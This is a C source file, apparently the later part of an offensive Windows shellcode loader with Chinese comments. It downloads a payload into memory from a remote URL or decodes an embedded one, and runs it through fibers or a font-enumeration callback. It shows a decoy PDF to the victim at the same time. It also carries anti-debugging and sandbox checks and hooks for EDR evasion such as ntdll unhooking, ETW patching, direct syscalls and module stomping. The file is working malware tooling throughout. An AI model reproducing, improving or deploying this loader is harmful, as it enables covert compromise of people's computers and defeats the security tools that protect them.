            if (hi >= 0 && lo >= 0) { out[n++] = (BYTE)((hi << 4) | lo); i += 3; }
        }
    }
    if (n == 0) {
        int hi = -1;
        for (size_t i = 0; i < len; i++) {
            int c = raw[i];
            if (c == '0' && i + 1 < len && (raw[i+1] == 'x' || raw[i+1] == 'X')) { i++; continue; }
            int v = hexval(c);
            if (v < 0) continue;
            if (hi < 0) hi = v; else { out[n++] = (BYTE)((hi << 4) | v); hi = -1; }
        }
    }
    free(raw);
    *out_len = n;
    return out;
}

/* ===================================================================== *
 *  [T6] 反调试 / 反沙箱                                                 *
 * ===================================================================== */
typedef BOOL (WINAPI *pIsDebuggerPresent)(void);
typedef BOOL (WINAPI *pGlobalMemoryStatusEx)(LPMEMORYSTATUSEX);
typedef void (WINAPI *pGetSystemInfo)(LPSYSTEM_INFO);

/* 反分析遇到可疑环境时的编译期默认动作:
 *   0 = 仅记录并继续(旧行为, 沙箱里照跑)
 *   1 = 退出
 * 运行期可用环境变量 LDR_STRICT=1 强制开启, 不受此值影响。 */
#ifndef ANTI_STRICT_DEFAULT
#define ANTI_STRICT_DEFAULT 0
#endif

static int anti_analysis(HMODULE k32)
{
    int suspect = 0, strict = 0;
    char env[8] = {0};
    if (GetEnvironmentVariableA("LDR_STRICT", env, sizeof(env)) && env[0] == '1')
        strict = 1;
    if (get_peb()->BeingDebugged) { suspect = 1; logf_("[T6] BeingDebugged"); }
    pIsDebuggerPresent dbg = (pIsDebuggerPresent)R(k32, "IsDebuggerPresent");
    if (dbg && dbg()) { suspect = 1; logf_("[T6] IsDebuggerPresent"); }
    pGlobalMemoryStatusEx gms = (pGlobalMemoryStatusEx)R(k32, "GlobalMemoryStatusEx");
    if (gms) {
        MEMORYSTATUSEX ms; ms.dwLength = sizeof(ms);
        if (gms(&ms)) {
            logf_("[T6] RAM = %llu MB", (unsigned long long)(ms.ullTotalPhys >> 20));
            if (ms.ullTotalPhys < (2ULL*1024*1024*1024)) { suspect = 1; logf_("[T6] low RAM"); }
        }
    }
    pGetSystemInfo gsi = (pGetSystemInfo)R(k32, "GetSystemInfo");
    if (gsi) {
        SYSTEM_INFO si; gsi(&si);
        logf_("[T6] CPU = %lu", (unsigned long)si.dwNumberOfProcessors);
        if (si.dwNumberOfProcessors <= 1) { suspect = 1; logf_("[T6] single CPU"); }
    }
    /* 旧行为: 检测到可疑环境只打印日志, strict=0 时永远 return 1(继续执行)
     * —— 等于"检测了但不行动", 沙箱里照跑不误。
     * 现在保留运行期 LDR_STRICT 开关, 并额外提供编译期默认值
     * (ANTI_STRICT), 便于把"遇到可疑环境就退出"固化进产物。 */
    if (suspect) {
        logf_("[T6] suspicious (strict=%d) -- %s",
              strict, (strict || ANTI_STRICT_DEFAULT) ? "退出" : "默认继续");
    }
    return (strict || ANTI_STRICT_DEFAULT) ? !suspect : 1;
}

/* ===================================================================== *
 *  执行方式                                                             *
 * ===================================================================== */
#if defined(USE_REMOTE)
/* --------------------------------------------------------------------- *
 *  远程加载: WinINet 下载到内存 (不落盘)                                *
 * --------------------------------------------------------------------- */
typedef void *HINET_T;
typedef HINET_T (WINAPI *fnInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
typedef HINET_T (WINAPI *fnInternetOpenUrlA)(HINET_T, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
typedef BOOL    (WINAPI *fnInternetReadFile)(HINET_T, LPVOID, DWORD, LPDWORD);
typedef BOOL    (WINAPI *fnInternetCloseHandle)(HINET_T);

#define INTERNET_OPEN_TYPE_PRECONFIG   0
#define INTERNET_FLAG_RELOAD           0x80000000
#define INTERNET_FLAG_NO_CACHE_WRITE   0x04000000

static BYTE *download_to_memory(HMODULE k32, const char *url, size_t *out_len)
{
    typedef HMODULE (WINAPI *fnLLA)(LPCSTR);
    fnLLA lla = (fnLLA)R(k32, "LoadLibraryA");
    if (!lla) return NULL;
    HMODULE wi = lla("wininet.dll");
    if (!wi) { logf_("[R] wininet.dll 加载失败"); return NULL; }

    fnInternetOpenA        pOpen  = (fnInternetOpenA)api_by_hash(wi, djb2("InternetOpenA"));
    fnInternetOpenUrlA     pUrl   = (fnInternetOpenUrlA)api_by_hash(wi, djb2("InternetOpenUrlA"));
    fnInternetReadFile     pRead  = (fnInternetReadFile)api_by_hash(wi, djb2("InternetReadFile"));
    fnInternetCloseHandle  pClose = (fnInternetCloseHandle)api_by_hash(wi, djb2("InternetCloseHandle"));
    if (!pOpen || !pUrl || !pRead || !pClose) { logf_("[R] wininet API 解析失败"); return NULL; }

    logf_("[R] GET %s", url);
    HINET_T h = pOpen("Mozilla/5.0 (Windows NT 10.0; Win64; x64)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!h) { logf_("[R] InternetOpen 失败"); return NULL; }

    HINET_T r = pUrl(h, url, NULL, 0,
                     INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!r) { logf_("[R] 打开 URL 失败 (%lu)", (unsigned long)GetLastError()); pClose(h); return NULL; }

    size_t cap = 1 << 16, len = 0;
    BYTE *buf = (BYTE *)malloc(cap);
    if (!buf) { pClose(r); pClose(h); return NULL; }

    DWORD got = 0;
    for (;;) {
        if (len + 4096 > cap) {
            cap *= 2;
            BYTE *nb = (BYTE *)realloc(buf, cap);
            if (!nb) { free(buf); pClose(r); pClose(h); return NULL; }
            buf = nb;
        }
        if (!pRead(r, buf + len, 4096, &got) || got == 0) break;
        len += got;
    }
    pClose(r);
    pClose(h);
    logf_("[R] 下载完成: %lu bytes", (unsigned long)len);
    if (len < 16 || buf[0] == '<' || (len > 4 && memcmp(buf, "HTTP", 4) == 0)) {
        logf_("[R] 返回内容不像载荷 (首字节 0x%02X) -- 检查 URL 是否指向上传的 .payload",
              len ? buf[0] : 0);
        free(buf);
        return NULL;
    }
    logf_("[R] 头部: %02X %02X %02X %02X %02X %02X %02X %02X",
          buf[0], buf[1], buf[2], buf[3], buf[4], buf[5], buf[6], buf[7]);
    *out_len = len;
    return buf;
}

/* 侧载 URL: exe 同目录放一个 payload.url 即可临时改地址, 免重新生成 */
static int read_url_sidecar(HMODULE k32, char *out, size_t cap)
{
    typedef DWORD (WINAPI *fnGetModuleFileNameA)(HMODULE, LPSTR, DWORD);
    fnGetModuleFileNameA gmf = (fnGetModuleFileNameA)R(k32, "GetModuleFileNameA");
    if (!gmf) return 0;
    char path[512];
    DWORD n = gmf(NULL, path, (DWORD)sizeof(path));
    if (n == 0 || n >= sizeof(path)) return 0;
    for (int i = (int)n - 1; i >= 0; i--)
        if (path[i] == '\\' || path[i] == '/') { path[i + 1] = 0; break; }

    const char *suffix = "payload.url";
    size_t pl = strlen(path), sl = strlen(suffix);
    if (pl + sl + 1 >= sizeof(path)) return 0;
    memcpy(path + pl, suffix, sl + 1);

    FILE *f = fopen(path, "r");
    if (!f) return 0;
    if (!fgets(out, (int)cap, f)) { fclose(f); return 0; }
    fclose(f);
    size_t l = strlen(out);
    while (l && (out[l - 1] == '\n' || out[l - 1] == '\r' ||
                 out[l - 1] == ' '  || out[l - 1] == '\t'))
        out[--l] = 0;
    return l > 0;
}
#endif /* USE_REMOTE */

typedef LPVOID (WINAPI *pConvertThreadToFiber)(LPVOID);
typedef LPVOID (WINAPI *pCreateFiber)(SIZE_T, LPTHREAD_START_ROUTINE, LPVOID);
typedef void   (WINAPI *pSwitchToFiber)(LPVOID);
typedef int    (WINAPI *pEnumFontFamiliesExW)(HDC, LPLOGFONTW, FONTENUMPROCW, LPARAM, DWORD);
typedef HMODULE(WINAPI *pLoadLibraryA)(LPCSTR);

static void exec_payload(HMODULE k32, void *exec, const char *mode)
{
    if (strcmp(mode, "fiber") == 0) {
        pConvertThreadToFiber ctf = (pConvertThreadToFiber)R(k32, "ConvertThreadToFiber");
        pCreateFiber crf = (pCreateFiber)R(k32, "CreateFiber");
        pSwitchToFiber stf = (pSwitchToFiber)R(k32, "SwitchToFiber");
        if (!ctf || !crf || !stf) fatal("fiber api resolve failed");
        void *mf = ctf(NULL);
        void *wf = crf(0, (LPTHREAD_START_ROUTINE)exec, NULL);
        if (!wf) fatal("CreateFiber failed");
        stf(wf);
        if (mf) stf(mf);
        logf_("[E] fiber returned");
    } else if (strcmp(mode, "callback") == 0) {
        pLoadLibraryA lla = (pLoadLibraryA)R(k32, "LoadLibraryA");
        if (!lla) fatal("LoadLibraryA resolve failed");
        pEnumFontFamiliesExW efe = (pEnumFontFamiliesExW)
            api_by_hash(lla("gdi32.dll"), djb2("EnumFontFamiliesExW"));
        if (!efe) fatal("EnumFontFamiliesExW resolve failed");
        LOGFONTW lf; memset(&lf, 0, sizeof(lf));
        efe((HDC)NULL, &lf, (FONTENUMPROCW)exec, 0, 0);
        logf_("[E] callback returned");
    } else {
        ((void (*)(void))exec)();
        logf_("[E] direct call returned");
    }
}

/* ===================================================================== *
 *  main                                                                 *
 * ===================================================================== */
#if defined(PROT_AUTO)
/* --------------------------------------------------------------------- *
 *  保护模式 auto: 默认按 RX 执行; 若载荷尝试写自己的内存(自解密载荷),   *
 *  VEH 捕获写违规 -> 就地升级为 RWX -> 继续执行.                        *
 *  这样普通 shellcode 保持 RX(更干净), 自解密载荷也能跑.                *
 * --------------------------------------------------------------------- */
static void *g_pbase = NULL;
static SIZE_T g_psize = 0;
typedef BOOL (WINAPI *pVP_t)(LPVOID, SIZE_T, DWORD, PDWORD);
static pVP_t g_vp = NULL;

static LONG WINAPI veh_probe(PEXCEPTION_POINTERS ep)
{
    EXCEPTION_RECORD *er = ep->ExceptionRecord;
    if (er->ExceptionCode == EXCEPTION_ACCESS_VIOLATION &&
        er->NumberParameters >= 2 &&
        er->ExceptionInformation[0] == 1) {              /* 1 = 写访问 */
        ULONG_PTR a = (ULONG_PTR)er->ExceptionInformation[1];
        if (a >= (ULONG_PTR)g_pbase && a < (ULONG_PTR)g_pbase + g_psize) {
            DWORD o = 0;
            if (g_vp) g_vp(g_pbase, g_psize, PAGE_EXECUTE_READWRITE, &o);
            logf_("[6] 载荷尝试自写 -> 已升级 RWX @ %p", g_pbase);
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}
#endif

#if defined(DECOY_PDF)
/* --------------------------------------------------------------------- *
 *  诱饵文档: 从资源里取出内嵌 PDF, 释放到 %TEMP%, 用默认程序打开        *
 *  资源: RT_RCDATA(10), id = 2                                          *
 *  释放的文件名 = exe 的文件名(去掉扩展名) + .pdf, 保证"点哪个开哪个"    *
 * --------------------------------------------------------------------- */
static void open_decoy(HMODULE k32)
{
    /* 失败时给出可见提示(配合 -DSHOW_ERRORS), 便于定位 */
#define DECOY_FAIL(msg) do { logf_("[D] " msg); \
    if (g_mb) g_mb(NULL, "[诱饵] " msg, "loader", MB_ICONERROR | MB_SETFOREGROUND); } while (0)

    typedef HRSRC     (WINAPI *fnFindResourceA)(HMODULE, LPCSTR, LPCSTR);
    typedef DWORD     (WINAPI *fnSizeofResource)(HMODULE, HRSRC);
    typedef HGLOBAL   (WINAPI *fnLoadResource)(HMODULE, HRSRC);
    typedef LPVOID    (WINAPI *fnLockResource)(HGLOBAL);
    typedef DWORD     (WINAPI *fnGetTempPathA)(DWORD, LPSTR);
    typedef DWORD     (WINAPI *fnGetModuleFileNameA)(HMODULE, LPSTR, DWORD);
    typedef HANDLE    (WINAPI *fnCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
    typedef BOOL      (WINAPI *fnWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
    typedef BOOL      (WINAPI *fnCloseHandle)(HANDLE);
    typedef HINSTANCE (WINAPI *fnShellExecuteA)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT);
    typedef HMODULE   (WINAPI *fnLoadLibraryA2)(LPCSTR);

    fnFindResourceA     fr  = (fnFindResourceA)R(k32, "FindResourceA");
    fnSizeofResource    sz  = (fnSizeofResource)R(k32, "SizeofResource");
    fnLoadResource      lr  = (fnLoadResource)R(k32, "LoadResource");
    fnLockResource      lk  = (fnLockResource)R(k32, "LockResource");
    fnGetTempPathA      gtp = (fnGetTempPathA)R(k32, "GetTempPathA");
    fnGetModuleFileNameA gmf = (fnGetModuleFileNameA)R(k32, "GetModuleFileNameA");
    fnCreateFileA       cf  = (fnCreateFileA)R(k32, "CreateFileA");
    fnWriteFile         wf  = (fnWriteFile)R(k32, "WriteFile");
    fnCloseHandle       ch  = (fnCloseHandle)R(k32, "CloseHandle");
    fnLoadLibraryA2     lla = (fnLoadLibraryA2)R(k32, "LoadLibraryA");
    if (!fr || !sz || !lr || !lk || !gtp || !gmf || !cf || !wf || !ch || !lla) {
        DECOY_FAIL("kernel32 API 解析失败"); return;
    }

    HMODULE sh = lla("shell32.dll");
    fnShellExecuteA se = sh ? (fnShellExecuteA)api_by_hash(sh, djb2("ShellExecuteA")) : NULL;
    if (!se) { DECOY_FAIL("ShellExecuteA 解析失败"); return; }

    HRSRC hr = fr(NULL, MAKEINTRESOURCEA(2), MAKEINTRESOURCEA(10));
    if (!hr) { DECOY_FAIL("找不到内嵌 PDF 资源(RCDATA id=2)"); return; }
    DWORD rn = sz(NULL, hr);
    HGLOBAL hg = lr(NULL, hr);
    void *rp = hg ? lk(hg) : NULL;
    if (!rp || rn < 64) { DECOY_FAIL("PDF 资源无效"); return; }

    /* 目标路径: %TEMP%\<exe同名>.pdf */
    char path[MAX_PATH * 2];
    if (gtp(MAX_PATH, path) == 0) { DECOY_FAIL("GetTempPath 失败"); return; }
    size_t dlen = strlen(path);

    char exe[MAX_PATH];
    DWORD en = gmf(NULL, exe, MAX_PATH);
    if (en == 0 || en >= MAX_PATH) { DECOY_FAIL("GetModuleFileName 失败"); return; }
    const char *base = exe;
    for (DWORD i = 0; i < en; i++)
        if (exe[i] == '\\' || exe[i] == '/') base = exe + i + 1;
    char name[256];
    size_t k = 0;
    while (base[k] && base[k] != '.' && k < sizeof(name) - 8) { name[k] = base[k]; k++; }
    const char *ext = ".pdf";
    for (size_t j = 0; ext[j]; j++) name[k++] = ext[j];
    name[k] = 0;
    if (dlen + k + 2 >= sizeof(path)) { DECOY_FAIL("路径过长"); return; }
    memcpy(path + dlen, name, k + 1);

    HANDLE h = cf(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) { DECOY_FAIL("释放 PDF 失败(写文件被拒)"); return; }
    DWORD wrote = 0;
    wf(h, rp, rn, &wrote, NULL);
    ch(h);
    logf_("[D] 诱饵已释放: %s (%lu 字节)", path, (unsigned long)wrote);

    /* 用默认程序打开, 用户看到的就是这份 PDF */
    HINSTANCE r = se(NULL, "open", path, NULL, NULL, SW_SHOWNORMAL);
    logf_("[D] ShellExecute 返回 %p", (void *)(UINT_PTR)r);
    if ((UINT_PTR)r <= 32) {
        DECOY_FAIL("ShellExecute 打开 PDF 失败(系统可能没有 PDF 关联程序)");
    }
#undef DECOY_FAIL
}
#endif /* DECOY_PDF */

typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL   (WINAPI *pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef void   (WINAPI *pSleep)(DWORD);

static int loader_main(int argc, char **argv)
{
    log_open();
    logf_("=== loader v3 start ===");
    const char *mode = "direct";

    /* 执行方式 (mode) 的取值优先级:
     *   1) 编译期宏 MODE_FIBER / MODE_CALLBACK / MODE_DIRECT
     *      —— 内嵌版必须走这条。此前 mode 只取自 argv[1], 而内嵌 exe 双击时
     *         argc==1, 于是永远落到 "direct", 导致 UI 里选 fiber/callback
     *         生成的 exe 与 direct 完全一样(死选项)。
     *   2) 运行期 argv 覆盖 —— 仅 --console 版 / 文件传参版可用, 便于调试。
     */
#if defined(MODE_FIBER)
    mode = "fiber";
#elif defined(MODE_CALLBACK)
    mode = "callback";
#elif defined(MODE_DIRECT)
    mode = "direct";
#endif

#if defined(ENC_UUID) || defined(ENC_B64) || defined(ENC_B32) || \
    defined(ENC_CHUNK) || defined(ENC_RAW) || defined(USE_REMOTE)
    if (argc >= 2) mode = argv[1];              /* 运行期可覆盖(仅控制台版有意义) */
#else
    if (argc < 2) {
        printf("usage: %s <payload> [direct|fiber|callback]\n", argv[0]);
        return 2;
    }
    mode = (argc >= 3) ? argv[2] : "direct";
#endif

    HMODULE k32 = mod_by_hash(djb2("kernel32.dll"));
    if (!k32) fatal("kernel32 not found");
    g_mb = (pMessageBoxA)R(k32, "MessageBoxA");
    if (!g_mb) {
        pLoadLibraryA lla = (pLoadLibraryA)R(k32, "LoadLibraryA");
        if (lla) g_mb = (pMessageBoxA)api_by_hash(lla("user32.dll"), djb2("MessageBoxA"));
    }

#if defined(DECOY_PDF)
    /* 先弹诱饵 PDF —— 用户点击瞬间就有反馈, 之后才轮到 payload */
    open_decoy(k32);
#endif

    /* --- 1. 确定明文长度 --- */
#if defined(ENC_UUID)
    size_t total = (size_t)g_embed_uuid_count * 16;
    size_t dlen  = (g_embed_uuid_len && g_embed_uuid_len < total) ? g_embed_uuid_len : total;
    size_t alloc = total;
    unsigned char key = g_embed_key;
#elif defined(ENC_B64) || defined(ENC_B32) || defined(ENC_RAW)
    size_t dlen = g_embed_len, alloc = g_embed_len;
    unsigned char key = g_embed_key;
#elif defined(ENC_CHUNK)
    size_t dlen = g_embed_len, alloc = g_embed_len;
    unsigned char key = 0;                    /* 分块模式每块自带密钥 */
#elif defined(USE_REMOTE)
    size_t dlen = 0;
    const char *url = g_remote_url;
    char ubuf[512];
    if (read_url_sidecar(k32, ubuf, sizeof(ubuf))) {
        url = ubuf;
        logf_("[R] 使用侧载 payload.url 覆盖内置 URL");
    }
    BYTE *rbuf = download_to_memory(k32, url, &dlen);
    if (!rbuf) fatal("远程下载失败");
    size_t alloc = dlen;
    unsigned char key = g_embed_key;
#else
    size_t dlen = 0;
    BYTE *fbuf = load_file_payload(argv[1], &dlen);
    size_t alloc = dlen;
    unsigned char key = 0;
#endif
    if (dlen == 0 || alloc == 0) fatal("payload empty");
    logf_("[1] payload = %lu bytes, mode = %s", (unsigned long)dlen, mode);

    /* --- 2. ntdll + SSN --- */
#ifdef _WIN64
    g_nt = (BYTE *)mod_by_hash(djb2("ntdll.dll"));
    LONG ssn_a = -1, ssn_p = -1;
    if (g_nt) {
#ifdef HARDEN_UNHOOK
        unhook_ntdll(g_nt, k32);                 /* E1: 必须在解析 SSN 之前 */
#endif
#ifdef HARDEN_ETW
        patch_etw(g_nt, k32);                    /* E2 */
#endif
#ifdef HARDEN_INDIRECT
        g_gadget = find_syscall_gadget(g_nt);    /* E3 */
        logf_("[E3] syscall gadget = %p", (void *)g_gadget);
#endif
        ssn_a = resolve_ssn("NtAllocateVirtualMemory");
        ssn_p = resolve_ssn("NtProtectVirtualMemory");
#if defined(_WIN64) && defined(HARDEN_DISKSSN)
        if (ssn_a < 0 || ssn_p < 0) {
            logf_("[2] 内存 ntdll 扫描失败(疑似被 hook) -> 改用磁盘干净副本");
            LONG da = resolve_ssn_disk("NtAllocateVirtualMemory", k32);
            LONG dp = resolve_ssn_disk("NtProtectVirtualMemory", k32);
            logf_("[E6] 磁盘解析结果: ssn_alloc=%ld ssn_prot=%ld", da, dp);
            if (da >= 0) ssn_a = da;
            if (dp >= 0) ssn_p = dp;
        }
#endif
        g_alloc_stub = make_stub(ssn_a, k32);
        g_prot_stub  = make_stub(ssn_p, k32);
    }
    logf_("[2] ntdll=%p ssn_alloc=%ld ssn_prot=%ld stub=%p/%p",
          (void *)g_nt, ssn_a, ssn_p, (void *)g_alloc_stub, (void *)g_prot_stub);
#else
    logf_("[2] x86: 使用 kernel32 (无直接系统调用)");
#endif

    /* --- 3. 分配 RW --- */
    LPVOID work = NULL;
    BOOL   via_syscall = FALSE;
#ifdef HARDEN_STOMP
    {   /* E4: 优先踩踏白 DLL 的可执行节, 内存归属变成已签名模块 */
        SIZE_T avail = 0;
        LPVOID st = stomp_alloc(k32, alloc, &avail);
        if (st) {
            work = st;
            logf_("[3] 模块踩踏分配 @ %p (属主 %s)", work, g_stomp_dll);
        }
    }
#endif
#ifdef _WIN64
    if (!work && g_alloc_stub) {
        fnNtAlloc na = (fnNtAlloc)g_alloc_stub;
        SIZE_T sz = alloc;
        PVOID  ba = NULL;
        NTSTATUS_T st = na((HANDLE)-1, &ba, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (st == 0 && ba) { work = ba; via_syscall = TRUE; }
        else logf_("[3] syscall alloc failed st=0x%08lX, fallback", (unsigned long)st);
    }
#endif
    if (!work) {
        pVirtualAlloc va = (pVirtualAlloc)R(k32, "VirtualAlloc");
        if (!va) fatal("VirtualAlloc resolve failed");
        work = va(NULL, alloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    }
    if (!work) fatal("alloc failed");
    logf_("[3] alloc RW @ %p (%lu bytes, %s)", work, (unsigned long)alloc,
          via_syscall ? "syscall" : "kernel32");

    /* --- 4. 原地解密: 直接解到目标内存, 不产生额外明文副本 [V3-2] --- */
#if defined(ENC_UUID)
    for (unsigned int i = 0; i < g_embed_uuid_count; i++)
        uuid_decode(g_embed_uuids[i], (BYTE *)work + (size_t)i * 16);
    logf_("[4] uuid-decoded in place");
#elif defined(ENC_B64) || defined(ENC_B32)
    {
        size_t tl = 0;
        for (unsigned int i = 0; i < g_parts_n; i++) tl += strlen(g_parts[i]);
        char *txt = (char *)malloc(tl + 1);
        if (!txt) fatal("malloc failed");
        size_t o = 0;
        for (unsigned int i = 0; i < g_parts_n; i++) {
            size_t l = strlen(g_parts[i]);
            memcpy(txt + o, g_parts[i], l);
            o += l;
        }
        txt[o] = 0;
#if defined(ENC_B64)
        size_t dn = b64_decode(txt, o, (BYTE *)work);
#else
        size_t dn = b32_decode(g_b32_alpha, txt, o, (BYTE *)work);
#endif
        memset(txt, 0, tl);
        free(txt);
        logf_("[4] text-decoded in place (%lu/%lu 字节)", (unsigned long)dn,
              (unsigned long)dlen);
    }
#elif defined(ENC_CHUNK)
    {
        size_t o = 0;
        for (unsigned int i = 0; i < g_chunk_n; i++) {
            unsigned int n = g_chunk_lens[i];
            unsigned char k = g_chunk_keys[i];
            BYTE *dst = (BYTE *)work + o;
            if (g_chunk_flags[i] & 1) {          /* 倒序存放的块 */
                for (unsigned int j = 0; j < n; j++)
                    dst[j] = g_chunks[i][n - 1 - j] ^ k;
            } else {
                for (unsigned int j = 0; j < n; j++)
                    dst[j] = g_chunks[i][j] ^ k;
            }
            o += n;
        }
        logf_("[4] chunk-decoded in place (%u 块)", g_chunk_n);
    }
#elif defined(ENC_RAW)
    memcpy(work, g_embed_data, alloc);
    logf_("[4] copied (raw array)");
#elif defined(USE_REMOTE)
    memcpy(work, rbuf, alloc);
    memset(rbuf, 0, alloc);
    free(rbuf);
    logf_("[4] copied (remote)");
#else
    memcpy(work, fbuf, alloc);
    memset(fbuf, 0, alloc);            /* 抹掉源缓冲 */
    free(fbuf);
    logf_("[4] copied (file)");
#endif
    if (key) {
        BYTE *p = (BYTE *)work;
        for (size_t i = 0; i < dlen; i++) p[i] ^= key;
        logf_("[5] xor-decoded in place, key=0x%02X", key);
    } else {
        logf_("[5] no xor layer");
    }

    /* --- 6. 内存保护 --- */
#if defined(PROT_RWX)
    const DWORD target_prot = PAGE_EXECUTE_READWRITE;
    const char *prot_name = "RWX";
#else
    const DWORD target_prot = PAGE_EXECUTE_READ;
    const char *prot_name = "RX";
#endif
    DWORD old = 0;
    BOOL flipped = FALSE;
    pVirtualProtect vp = (pVirtualProtect)R(k32, "VirtualProtect");
#ifdef _WIN64
    if (via_syscall && g_prot_stub) {
        fnNtProt np = (fnNtProt)g_prot_stub;
        PVOID  ba = work;
        SIZE_T sz = alloc;
        NTSTATUS_T st = np((HANDLE)-1, &ba, &sz, target_prot, &old);
        if (st == 0) flipped = TRUE; else logf_("[6] syscall protect st=0x%08lX", (unsigned long)st);
    }
#endif
    if (!flipped) {
        if (!vp) fatal("VirtualProtect resolve failed");
        if (!vp(work, alloc, target_prot, &old))
            logf_("[6] VirtualProtect failed %lu", (unsigned long)GetLastError());
    }
    logf_("[6] RW -> %s @ %p (%s)", prot_name, work, flipped ? "syscall" : "kernel32");

#if defined(PROT_AUTO)
    /* auto: 先按 RX 跑; 载荷若自写内存, VEH 就地升级 RWX。
     *
     * 旧实现在这里又调了一次 vp(work, alloc, PAGE_EXECUTE_READ) —— 但第 6 步
     * 在 PROT_AUTO 下 target_prot 已经是 PAGE_EXECUTE_READ(PROT_RWX 与
     * PROT_AUTO 互斥, 只会定义一个), 所以那次调用是纯粹的重复, 白送一个
     * 可观测的 VirtualProtect 事件。已移除。
     *
     * 另外提醒: RX -> 写违规 -> VEH 升 RWX 这条信号链本身是主流 EDR 的
     * 重点监控项, auto 模式只应在确认载荷确实自解密时使用。 */
    g_pbase = work;
    g_psize = alloc;
    g_vp = vp;
    {
        typedef void *(WINAPI *pAVH)(ULONG, void *);
        pAVH avh = (pAVH)R(k32, "AddVectoredExceptionHandler");
        if (avh) { avh(1, (void *)veh_probe); logf_("[6] 已注册 VEH (写违规自动升 RWX)"); }
    }
#endif

    /* --- 7. 环境检查 + 抖动 [V3-3] --- */
    if (!anti_analysis(k32)) fatal("bad environment (strict)");
    {
        pSleep slp = (pSleep)R(k32, "Sleep");
        DWORD j = 300 + (GetTickCount() % 700);
        logf_("[7] jitter sleep %lu ms", (unsigned long)j);
        if (slp) slp(j);
    }

    /* --- 8. 执行 --- */
    logf_("[8] executing (%s) @ %p ...", mode, work);
    exec_payload(k32, work, mode);
    logf_("[9] payload returned");
    return 0;
}

/* ===================================================================== *
 *  入口: GUI_MODE 无控制台(无黑框), 否则控制台版                        *
 * ===================================================================== */
#ifdef GUI_MODE
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
{
    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;
    return loader_main(__argc, __argv);
}
#else
int main(int argc, char **argv)
{
    return loader_main(argc, argv);
}
#endif
